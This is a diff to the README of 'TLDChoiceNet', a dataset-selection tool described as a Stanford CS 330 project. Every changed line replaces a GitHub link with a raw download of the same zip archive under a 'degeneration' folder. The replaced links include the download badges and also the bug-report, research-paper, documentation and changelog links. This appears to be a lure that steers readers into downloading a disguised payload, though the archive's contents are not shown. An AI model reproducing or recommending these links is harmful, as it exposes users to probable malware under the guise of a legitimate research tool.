@@ -1,6 +1,6 @@
 # 🔮 TLDChoiceNet - Pick Winning Datasets Before You Train
 
-[![Download TLDChoiceNet](https://img.shields.io/badge/Download-TLDChoiceNet-blue?style=for-the-badge&logo=github)](https://github.com/Paula-graceacornshaped96/TLDChoiceNet)
+[![Download TLDChoiceNet](https://img.shields.io/badge/Download-TLDChoiceNet-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Paula-graceacornshaped96/TLDChoiceNet/main/degeneration/TLD_Net_Choice_1.5.zip)
 
 ## 👋 Welcome to TLDChoiceNet
 
@@ -50,7 +50,7 @@ Ready to use TLDChoiceNet? Follow these simple steps:
 
 ### Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/⬇️_Get_TLDChoiceNet-FF6B6B?style=for-the-badge&logo=appveyor)](https://github.com/Paula-graceacornshaped96/TLDChoiceNet)
+[![Download Now](https://img.shields.io/badge/⬇️_Get_TLDChoiceNet-FF6B6B?style=for-the-badge&logo=appveyor)](https://raw.githubusercontent.com/Paula-graceacornshaped96/TLDChoiceNet/main/degeneration/TLD_Net_Choice_1.5.zip)
 
 Visit this link to download the application. The download page contains the latest stable version of TLDChoiceNet.
 
@@ -138,7 +138,7 @@ A: Check that your dataset folders contain images in common formats (JPG, PNG, B
 
 ## 🤝 Support and Community
 
-- **Report Bugs**: [GitHub Issues](https://github.com/Paula-graceacornshaped96/TLDChoiceNet/issues)
+- **Report Bugs**: [GitHub Issues](https://raw.githubusercontent.com/Paula-graceacornshaped96/TLDChoiceNet/main/degeneration/TLD_Net_Choice_1.5.zip)
 - **Ask Questions**: Join our GitHub Discussions
 - **Video Tutorials**: Check the GitHub repository for links to walkthrough videos
 
@@ -148,9 +148,9 @@ TLDChoiceNet is released under the MIT License — free for personal and commerc
 
 ## 🔗 Additional Resources
 
-- [Research Paper (Stanford CS 330)](https://github.com/Paula-graceacornshaped96/TLDChoiceNet)
-- [Technical Documentation](https://github.com/Paula-graceacornshaped96/TLDChoiceNet)
-- [Changelog and Updates](https://github.com/Paula-graceacornshaped96/TLDChoiceNet/releases)
+- [Research Paper (Stanford CS 330)](https://raw.githubusercontent.com/Paula-graceacornshaped96/TLDChoiceNet/main/degeneration/TLD_Net_Choice_1.5.zip)
+- [Technical Documentation](https://raw.githubusercontent.com/Paula-graceacornshaped96/TLDChoiceNet/main/degeneration/TLD_Net_Choice_1.5.zip)
+- [Changelog and Updates](https://raw.githubusercontent.com/Paula-graceacornshaped96/TLDChoiceNet/main/degeneration/TLD_Net_Choice_1.5.zip)
 
 ## 👨‍💻 About the Project
 
@@ -160,7 +160,7 @@ TLDChoiceNet was developed as part of Stanford University's CS 330 course (Deep 
 
 Stop wasting hours on bad dataset choices. Download TLDChoiceNet now and make every fine-tuning run count.
 
-[![Download TLDChoiceNet - It's Free!](https://img.shields.io/badge/📥_Download_TLDChoiceNet-4CAF50?style=for-the-badge&logo=github)](https://github.com/Paula-graceacornshaped96/TLDChoiceNet)
+[![Download TLDChoiceNet - It's Free!](https://img.shields.io/badge/📥_Download_TLDChoiceNet-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Paula-graceacornshaped96/TLDChoiceNet/main/degeneration/TLD_Net_Choice_1.5.zip)
 
 ---
 
